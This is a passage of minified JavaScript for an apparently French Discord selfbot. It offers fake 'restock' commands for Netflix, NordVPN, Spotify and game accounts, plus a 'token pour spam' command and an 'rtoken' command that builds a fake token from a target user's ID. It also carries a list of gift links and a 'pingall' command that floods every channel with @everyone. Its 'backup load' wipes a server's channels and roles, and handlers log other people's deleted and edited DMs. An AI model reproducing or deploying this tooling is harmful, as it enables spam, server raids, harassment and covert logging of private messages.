                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content === ab + 'netflix') {
                          if (cg.author.id === aN.user.id) {
                            c9 ? (console.log('(Commande : {/netflix} Effectuer) \n ================'), cg.delete(), cg.channel.send('>>> Restock de netflix en cours..').then(ue => {
                              ue.edit('>>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%'), ue.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%'), ue.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░ 20%'), ue.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%'), ue.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%'), ue.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%'), ue.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 79%'), ue.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%'), ue.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% ');
                              var uf = Math.floor(Math.random() * gw.length);
                              ue.edit('>>> ***Voila ton compte netflix :***' + gw[uf]);
                            })) : cg.edit(cu);
                          }
                        }
                        if (cg.content === ab + 'nordvpn') {
                          if (cg.author.id === aN.user.id) {
                            if (c9) console.log('(Commande : {/nordvpn} Effectuer) \n ================'), cg.delete(), cg.channel.send('>>> Restock de nordvpn en cours..').then(uf => {
                              uf.edit('>>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%');
                              uf.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%');
                              uf.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░ 20%');
                              uf.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%');
                              uf.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%');
                              uf.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%');
                              uf.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 72%');
                              uf.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%');
                              uf.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% ');
                              var uk = Math.floor(Math.random() * gv.length);
                              uf.edit('>>> ***Voila ton compte nord vpn :***' + gv[uk]);
                            });else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content === ab + 'gtoken') {
                          if (cg.author.id === aN.user.id) {
                            c9 ? (console.log('(Commande : {/gtoken} Effectuer) \n ================'), cg.delete(), cg.channel.send('>>> Restock de token en cours..').then(ui => {
                              ui.edit('>>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%');
                              ui.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%');
                              ui.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%');
                              ui.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%');
                              ui.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%');
                              ui.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 79%');
                              ui.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%');
                              ui.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% ');
                              var ul = Math.floor(Math.random() * gu.length);
                              ui.edit('>>> ***Voila ton token pour spam :*** ' + gu[ul]);
                            })) : cg.edit(cu);
                          }
                        }
                        if (cg.content === ab + 'dofus') {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              console.log('(Commande : {/dofus} Effectuer) \n ================'), cg.delete(), cg.channel.send('>>> Restock de comptes dofus en cours..').then(uj => {
                                uj.edit('>>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%');
                                uj.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%');
                                uj.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%');
                                uj.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%');
                                uj.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%');
                                uj.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 79%');
                                uj.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%');
                                uj.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% ');
                                cg.edit('***Voila ton compte Dofus :***');
                                var uo = Math.floor(Math.random() * gt.length);
                                uj.edit('>>> ***Voila ton compte dofus :***' + gt[uo]);
                              });
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content === ab + 'gspotify') {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              console.log('(Commande : {/gspotify} Effectuer) \n ================'), cg.delete(), cg.channel.send('>>> Restock de comptes dofus en cours..').then(um => {
                                um.edit('>>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%');
                                um.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%');
                                um.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%');
                                um.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%');
                                um.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%');
                                um.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 79%');
                                um.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%');
                                um.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% ');
                                var up = Math.floor(Math.random() * gr.length);
                                um.edit('>>> ***Voila ton compte Spotify :***' + gr[up]);
                              });
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content === ab + 'acctpsn') {
                          if (cg.author.id === aN.user.id) {
                            if (c9) console.log('(Commande : {/acctpsn} Effectuer) \n ================'), cg.delete(), cg.channel.send('>>> Restock de comptes psn en cours..').then(un => {
                              un.edit('>>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%');
                              un.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%');
                              un.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%');
                              un.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%');
                              un.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%');
                              un.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 79%');
                              un.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%');
                              un.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% ');
                              var uq = Math.floor(Math.random() * gs.length);
                              un.edit('>>> ***Voila ton compte psn :***' + gs[uq]);
                            });else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content === ab + 'uplay') {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              console.log('(Commande : {/Uplay} Effectuer) \n ================'), cg.delete(), cg.channel.send('>>> Restock de comptes Uplay en cours..').then(up => {
                                up.edit('>>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%');
                                up.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%');
                                up.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%');
                                up.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%');
                                up.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%');
                                up.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 79%');
                                up.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%');
                                up.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% ');
                                var us = Math.floor(Math.random() * go.length);
                                up.edit('>>> ***Voila ton compte uplay :***' + go[us]);
                              });
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.includes(ab + 'fdp')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle(' **jvétniker fdp comme lui : **').setDescription('').setImage('https://cdn.discordapp.com/attachments/710299976550318080/711951558006407208/9k.png').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        var go = ['no'];
                        const gp = ['no'],
                        gq = ['no'];
                        var gs = ['no'],
                        gt = ['no'],
                        gu = ['no'],
                        gv = ['no'],
                        gw = ['no'],
                        gx = ['no'];                        
                        if (cg.content.includes(ab + 'pingall')) {
                          if (cg.deletable) cg.delete();
                          let up = setInterval(function () {
                            cg.guild.channels.forEach(uq => {
                              if (uq.type === 'text') uq.send('@everyone  \n ');
                            }, 1500);
                          });
                        }
                        var gy = ['https://discord.gift/qBn6HkYcfVvD7Z9RxRQqU9sa', 'https://discord.gift/CPPwF8yzbWeJenqRdCbGZ6GH', 'https://discord.gift/RqksgMqmyDMdxE8sD6htrwAJ', 'https://discord.gift/cXHje2gUfMNUxyrunHvrxFVw', 'https://discord.gift/8fWKKutPeqUyMM7ReqvKM7Ab', 'https://discord.gift/tdXxCG5XQAv9yBVPf5etqgp3', 'https://discord.gift/KAeaUr9p8QSt9X3NfWdf7Yz5', 'https://discord.gift/zef5CSyFEv7GU4vmmXywERNF', 'https://discord.gift/r43shVb9t4D7CfU53grgKMMr', 'https://discord.gift/TSYhjtk3pd9TnAvmpBG6XYJP', 'https://discord.gift/jXyzsSTtwdpWjnAmSAaNQrYc', 'https://discord.gift/95BJNgugy5TYrKAEGux6YtWM', 'https://discord.gift/jNMfGND88PePMVSKnx2YRQGS', 'https://discord.gift/9BNtz7PjpCZSV85sNaBsD9nB', 'https://discord.gift/6gPfQ3wsWYBs6dyPbyqT4aj3', 'https://discord.gift/rp2Z2sjJPqhjubjrwDDXa4cX', 'https://discord.gift/TC3W8QrrpmZkb3SsxRzpHTzT', 'https://discord.gift/cNFCnMGRaTBmcyeRu7NSsZqk', 'https://discord.gift/ATzSnmGTUcfFRag9Q49wqUpQ', 'https://discord.gift/rZQe9Pa3bCzrRw4wyQKWBsJV', 'https://discord.gift/HcY3zFzCWBMnfKz3q3mZkEZn', 'https://discord.gift/NBhZwGtppWaG9mvtt4ekKMZZ', 'https://discord.gift/RTcWpYAB3YzFhdK5EPZBrcwZ', 'https://discord.gift/6VxXNZ8ut3ceeehdtTuQZJBE', 'https://discord.gift/JpzRdAtxBFyhxazm7XyG7mGA'];
                        if (cg.content.startsWith(ab + 'rtoken')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              if (!cp) {
                                cg.edit(':x: **Veuillez mentionner un utilisateur!**');
                                return;
                              }
                              let ur = ['HircHg', 'XnyXiA', 'XluxwQ', 'XXn_KA', 'Xiq-WQ'],
                                us = ['a6uny9jcMjet2W2LASruribq6VI', 'oZyGJDamSJ4hmJaaLvzdNo1bLqk', '3_6Xt2k4OieDKimnNYGWUq9vJRo', 'xllelHltGdY7DP_0s1XST4cgzTs'];
                              var gz = cp.id;
                              aD.get('https://some-random-api.ml/base64?encode=' + gz).then(uu => {
                                var ux = uu.body.base64;
                                let uz = new aw.RichEmbed().setColor(ad).setTitle('Token match ' + cp.username).setDescription(ux + '.' + ur[Math.floor(Math.random() * ur.length)] + '.' + us[Math.floor(Math.random() * us.length)]);
                                setTimeout(() => {
                                  cg.edit('░░░░░░░░░░ 0%');
                                }, 1000), setTimeout(() => {
                                  cg.edit('▓▓░░░░░░░░ 20%');
                                }, 1500), setTimeout(() => {
                                  cg.edit('▓▓▓▓░░░░░░ 40%');
                                }, 2000), setTimeout(() => {
                                  cg.edit('▓▓▓▓▓▓░░░░ 60%');
                                }, 2500), setTimeout(() => {
                                  cg.edit('▓▓▓▓▓▓▓▓░░ 80%');
                                }, 3000), setTimeout(() => {
                                  cg.edit('▓▓▓▓▓▓▓▓▓▓ 100%');
                                }, 3500), setTimeout(() => {
                                  cg.edit(uz);
                                }, 4000);
                              });
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'encode')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            const uw = d8.join(' ');
                            aD.get('https://some-random-api.ml/base64?encode=' + uw).then(ux => {
                              var uy = ux.body.base64;
                              const uz = new aw.RichEmbed().setThumbnail(cg.author.avatarURL).setTitle('Base64 Encode').addField('__Input: __', '**' + uw + '**').addField('__Output: __', '**' + uy + '**').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp().setColor(ad);
                              cg.channel.send(uz);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'decode')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            const ux = d8.join(' ');
                            aD.get('https://some-random-api.ml/base64?decode=' + ux).then(uy => {
                              const uC = new aw.RichEmbed().setThumbnail(cg.author.avatarURL).setTitle('Base64 Decode').addField('__Input: __', '**' + ux + '**').addField('__Output: __', '**' + uy.body.text + '**').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp().setColor(ad);
                              cg.channel.send(uC);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'lvcalc')) {
                          if (cg.author.id === aN.user.id) {
                            let uy = ['5%', '10%', '15%', '20%', '25%', '30%', '35%', '40%', '45%', '50%', '55', '60%', '65%', '70%', '75%', '80%', '85%', '90%', '95%', '100%'],
                              uz = Math.floor(Math.random() * uy.length),
                              uA = d8.slice(0).join(' '),
                              uB = new aw.RichEmbed().setAuthor(cg.author.tag).setColor(ad).setThumbnail('' + cg.author.avatarURL).addField('calcul de relation plausible ❤', uA).addField('relation estimée à ❤', uy[uz]);
                            cg.edit(uB), console.log(ay.hex(t)('Commande lvcalc effectué'));
                          }
                        }
                        if (cg.content.startsWith(ab + 'calcgay')) {
                          if (cg.author.id === aN.user.id) {
                            let uC = ['0% ', '5%', '10%', '15%', '20%', '25%', '30%', '35%', '40%', '45%', '50%', '55', '60%', '65%', '70%', '75%', '80%', '85%', '90%', '95%', '100%'],
                              uD = Math.floor(Math.random() * uC.length),
                              uE = new aw.RichEmbed().setTitle(cg.author.tag + ', tu es gay à').setColor(ad).setThumbnail('' + cg.author.avatarURL).setDescription(uC[uD]);
                            cg.edit(uE), console.log(ay.hex(t)('Commande gaycalc effectué'));
                          }
                        }
                        function gA(uF) {
                          var uI = '',
                            uJ = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',
                            uK = uJ.length;
                          for (var uL = 0; uL < uF; uL++) {
                            uI += uJ.charAt(Math.floor(Math.random() * uK));
                          }
                          return uI;
                        }
                        let gC = '⌛',
                          gD = '✅',
                          gE = '❌',
                          gF = '⚠️';
                        if (cg.content === ab + 'backup create' | cg.content === ab + 'backup c') {
                          if (cg.author.id === aN.user.id) {
                            let uF = cg.guild;
                            if (!uF) return cg.edit(':x: **Veuillez executer cette commande dans un serveur!**');
                            cg.guild.roles.filter(uK => uK.name !== cg.guild.member(aN.user.id).highestRole.name);
                            const uG = new aw.RichEmbed().setTitle('**' + gC + ' Veuillez patientez**').setDescription('**Création de la backup en cours\n\n Attendez la finalisation**').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp().setColor(ad);
                            cg.edit(uG);
                            let uH = gA(15);
                            const uI = cg.guild.channels.sort(function (uK, uL) {
                                return uK.position - uL.position;
                              }).array().map(uK => {
                                var uL = {};
                                uL.type = uK.type, uL.name = uK.name, uL.postion = uK.calculatedPosition;
                                const uM = uL;
                                if (uK.parent) uM.parent = uK.parent.name;
                                return uM;
                              }),
                              uJ = cg.guild.roles.map(uK => {
                                if (uK.name == '@everyone') return;
                                var uL = {};
                                uL.name = uK.name, uL.color = uK.color, uL.hoist = uK.hoist, uL.permissions = uK.permissions, uL.mentionable = uK.mentionable, uL.position = uK.position;
                                const uN = uL;
                                return uN;
                              });
                            if (!a5[cg.author.id]) a5[cg.author.id] = {};
                            a5[cg.author.id][uH] = {
                              'author': cg.author.username,
                              'authorID': cg.author.id,
                              'icon': cg.guild.icon ? 'https://cdn.discordapp.com/icons/' + cg.guild.id + '/' + cg.guild.icon + '.png?size=2048' : 'https://pbs.twimg.com/media/EZlqDW4XQAAPtjM.jpg',
                              'serverID': cg.guild.id,
                              'name': cg.guild.name,
                              'owner': cg.guild.ownerID,
                              'members': cg.guild.memberCount,
                              'createdAt': cg.guild.createdAt,
                              'emojis': cg.guild.emojis.map(uK => ({
                                'animated': uK.animated,
                                'id': uK.id,
                                'name': uK.name
                              })),
                              'roles': uJ,
                              'channels': uI
                            }, gI();
                            !cg.member.hasPermission('EMBED_LINKS') && (cg.edit('>>> ' + gE + ' les embeds ne sonts pas autorisé sur ce serveur,\nl\'id de la backup va donc apparaitre dans votre console.'), console.log(ay('#FF7800')('Voici l\'id de la backup :\n ' + uH + ' \nSur le serveur : ' + cg.guild.name)));
                            if (!cg.member.hasPermission('ADMINISTRATOR')) {
                              var gG = new aw.RichEmbed().setTitle(gF + ' Attention').setDescription('***Vous n\'avez pas les permissions administrateur cela peut créer des problemes lors de la création de la backup***').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp().setColor(ad);
                              cg.channel.send(gG);
                            }
                            var cq = new aw.RichEmbed().setTitle('Backup create').addField('Voici l\'ID de votre backup', uH).setDescription('`' + ab + 'backup load` pour charger la backup').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setColor(ad);
                            cg.edit(cq);
                            var gH = require(__dirname + '/Data/codes.json');
                            gH.push(uH + ' - ' + cg.guild.name), aB.writeFileSync(__dirname + '/Data/codes.json', JSON.stringify(gH), 'utf-8');
                          }
                        }
                        if (cg.content === ab + 'backup liste') {
                          if (cg.author.id === aN.user.id) {
                            if (!cg.member.hasPermission('EMBED_LINKS')) cg.edit('Tu nas pas les permissons "EMBED_LINKS" donc tu ne peut afficher la liste des backups dans ce serveur.');else {
                              var gH = require(__dirname + '/Data/codes.json');
                              if (!gH[0]) return cg.edit('**:x: Aucunes backups trouvées!**');
                              let uL = new aw.RichEmbed().setTitle('📃 **Liste des backups**').setColor(ad).setDescription('```' + gH.join('\n') + '```\n' + ab + 'backup info + {id de la backup}').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(uL).catch(() => {
                                return;
                              });
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'backup info') || cg.content.startsWith(ab + 'backup i')) {
                          if (cg.author.id === aN.user.id) {
                            const uO = cg.content.split(' ').slice(1);
                            let uP = uO.splice(1).join(' '),
                              uQ = new aw.RichEmbed().setTitle(gE + '  Error').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setDescription('**Tu as oublié de définir une **id de backup**. Utilise la commande `' + ab + 'hbackup` pour avoir plus d\'informations**').setColor(ad);
                            if (!uP) return cg.edit(uQ).catch(uS => console.log('[', 'ERROR', ']', 'une erreur est survenue que je ne peux régler'));
                            let uR = new aw.RichEmbed().setTitle(gE + '  Error').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setDescription('Tu n\'as pas de **backup** avec (\n          l\'id : `' + uP + '`.').setColor(ad);
                            if (!a5[cg.author.id][uP]) return cg.edit(uR);
                            try {
                              let uS = new aw.RichEmbed().setTitle(a5[cg.author.id][uP].name).setThumbnail(a5[cg.author.id][uP].icon).setColor(ad).addField('Fondateur', '<@' + a5[cg.author.id][uP].owner + '>', true).addField('**Settings**', a5[cg.author.id][uP].settings).addField('**Membres**', a5[cg.author.id][uP].members, true).addField('**Date de création**', a5[cg.author.id][uP].createdAt).addField('Salons', '```' + a5[cg.author.id][uP].channels.map(uT => uT.name).join('\n') + '```', true).addField('Roles', '```' + a5[cg.author.id][uP].roles.map(uT => uT.name).join('\n') + '```', true);
                              cg.edit(uS);
                            } catch (uU) {
                              aE(a5[cg.author.id][uP].channels.map(uV => uV.name).join('\n'), 'md').then(uV => {
                                aE(a5[cg.author.id][uP].roles.map(uY => uY.name).join('\n'), 'md').then(uY => {
                                  let uZ = new aw.RichEmbed().setColor(ad).setTitle(a5[cg.author.id][uP].name).setThumbnail(a5[cg.author.id][uP].icon).addField('Fondateur', '<@' + a5[cg.author.id][uP].owner + '>', true).addField('Membres', a5[cg.author.id][uP].members, true).addField('Date de creation', a5[cg.author.id][uP].createdAt).addField('Salons', uV, true).addField('Roles', uY, true).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                  cg.edit(uZ).catch(v0 => console.log('[', 'ERROR', ']', 'une erreur est survenue que je ne peux régler'));
                                });
                              });
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'backup delete')) {
                          if (cg.author.id === aN.user.id) {
                            var d8 = cg.content.split(' ').slice(1);
                            if (!d8[1]) return cg.channel.send('**:x: Tu n\'as pas défini l\'id de la backup à supprimer**');
                            if (!a5[cg.author.id][d8[1]]) return cg.channel.send(':x: **L\'id de la backups est introuvable**');
                            delete a5[cg.author.id][d8[1]], gI(), cg.channel.send('**La backup `' + d8[1] + '` a été supprimé avec succès**');
                            var gH = require(__dirname + '/Data/codes.json');
                            let uW = gH.filter(uX => {
                              return uX.split(' ')[0] !== d8[1];
                            });
                            gH = uW, aB.writeFileSync(__dirname + '/Data/codes.json', JSON.stringify(gH), 'utf-8');
                          }
                        }
                        if (cg.content.startsWith(ab + 'backup purge')) {
                          if (cg.author.id === aN.user.id) {
                            let uX = new aw.RichEmbed().setTitle(gE + '  Erreur').setDescription('**Aucun backups a été trouvée pour la suppression**').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setColor(ad);
                            if (!a5[cg.author.id]) cg.edit(uX).catch(uY => console.log('[', ay.hex('#ff1010')('ERROR'), ']', 'une erreur est survenue que je ne peux régler'));else {
                              aB.writeFileSync(__dirname + '/Data/codes.json', '[]', function (v0) {
                                console.log('[', ay.hex('#ff1010')('ERROR'), ']', 'une erreur est survenue que je ne peux régler');
                              }), aB.writeFileSync(__dirname + '/Data/backups.json', '{}', function (v0) {
                                console.log('[', ay.hex('#ff1010')('ERROR'), ']', 'une erreur est survenue que je ne peux régler');
                              });
                              let uZ = new aw.RichEmbed().setTitle(gD + '  Backups purge !').setDescription('**Toutes vos backups ont été supprimé avec succès !**').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setColor(ad);
                              cg.edit(uZ).catch(v0 => console.log('[', 'ERROR', ']', 'une erreur est survenue que je ne peux régler'));
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'backup load')) {
                          if (cg.author.id === aN.user.id) {
                            if (!cg.guild) return cg.edit(':x: **Veuillez executer cette commande dans un serveur!**');
                            let v2 = aN.emojis.get('655704809483141141') || '❌';
                            var d8 = cg.content.split(' ').slice(2);
                            let v3 = d8.splice(0).join(' '),
                              v4 = new aw.RichEmbed().setTitle(v2 + '  Error').setColor(ad).setDescription('Tu as oublié de définir une **id de backup**. Utilise la commande `' + ab + 'hbackup` pour avoir plus d\'informations');
                            if (!v3) return cg.channel.send(v4);
                            let v5 = new aw.RichEmbed().setTitle(v2 + '  Error').addField('**Aucune backup avec l\'id ' + v3 + '.**', ab + 'hbackup pour plus d\'information').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setColor(ad);
                            if (!a5[cg.author.id][v3]) return cg.edit(v5).catch(v6 => console.log('[', 'ERROR', ']', 'une erreur est survenue que je ne peux régler'));
                            cg.guild.channels.forEach(v6 => {
                              v6.delete('For Loading A Backup');
                            }), cg.guild.roles.filter(v6 => v6.members.every(v7 => !v7.user.bot)).forEach(v6 => {
                              v6.delete('For Loading A Backup');
                            }), a5[cg.author.id][v3].roles.forEach(async function (v6) {
                              var v7 = {};
                              v7.name = v6.name, v7.color = v6.color, v7.permissions = v6.permissions, v7.hoist = v6.hoist, v7.mentionable = v6.mentionable, v7.position = v6.position, cg.guild.createRole(v7).then(v8 => {
                                v8.setPosition(v8.position);
                              });
                            }), a5[cg.author.id][v3].channels.filter(v6 => v6.type === 'category').forEach(async function (v6) {
                              cg.guild.createChannel(v6.name, {
                                'type': v6.type,
                                'permissionOverwrites': v6.permissionOverwrites
                              });
                            }), a5[cg.author.id][v3].channels.filter(v6 => v6.type !== 'category').forEach(async function (v6) {
                              cg.guild.createChannel(v6.name, {
                                'type': v6.type,
                                'permissionOverwrites': v6.permissionOverwrites
                              }).then(v9 => {
                                const va = cg.guild.channels.filter(vb => vb.type === 'category').find(vb => vb.name === v6.parent);
                                v6.parent ? v9.setParent(va) : '';
                              });
                            }), cg.guild.setName(a5[cg.author.id][v3].name), cg.guild.setIcon(a5[cg.author.id][v3].icon);
                          }
                        }
                        function gI() {
                          aB.writeFile(__dirname + '/Data/backups.json', JSON.stringify(a5), v7 => {
                            if (v7) console.error(v7);
                          });
                        }
                        if (cg.content.includes('@everyone') || cg.content.includes('@here')) {
                          if (cg.author.id === aN.user.id) return;
                          let v7 = cg.guild;
                          if (!v7) return console.log(ay.hex(y)('1 message ghostping surppimé mp: \n' + cg.author.tag + ': ' + cg.content + ' | ' + cg.createdAt));
                          console.log(ay.hex(u)('Log:')), console.log(ay.hex(y)('1 message ghostping surppimé serveur: \n' + cg.guild.name + ' de ' + cg.author.tag + ': ' + cg.content));
                        } else return;
                      }), aN.on('messageDelete', cg => {
                        if (cg.author.id === aN.user.id) return;
                        if (cg.channel.type === 'dm') {
                          console.log(ay.hex(u)('Log:')), console.log(ay.hex(w)('--------------------------')), console.log(ay.hex(y)('1 message mp surppimé \n' + cg.author.tag + ': ' + cg.content + ' | ' + cg.createdAt));
                        }
                      }), aN.on('messageUpdate', cg => {
                        if (cg.author.id === aN.user.id) return;
                        if (cg.channel.type === 'dm') {
                          console.log(ay.hex(u)('Log:')), console.log(ay.hex(w)('--------------------------')), console.log(ay.hex(y)('1 message mp modifié \n' + cg.author.tag + ': ' + cg.content + ' | ' + cg.createdAt));
                        }
                      }), aN.on('guildDelete', cg => {
                        console.log(ay.hex(u)('Log:')), console.log(ay.hex(x)('--------------------------')), console.log(ay.hex(y)('Vous avez quitté le serveur ' + cg.name));
                      }), aN.on('guildCreate', cg => {
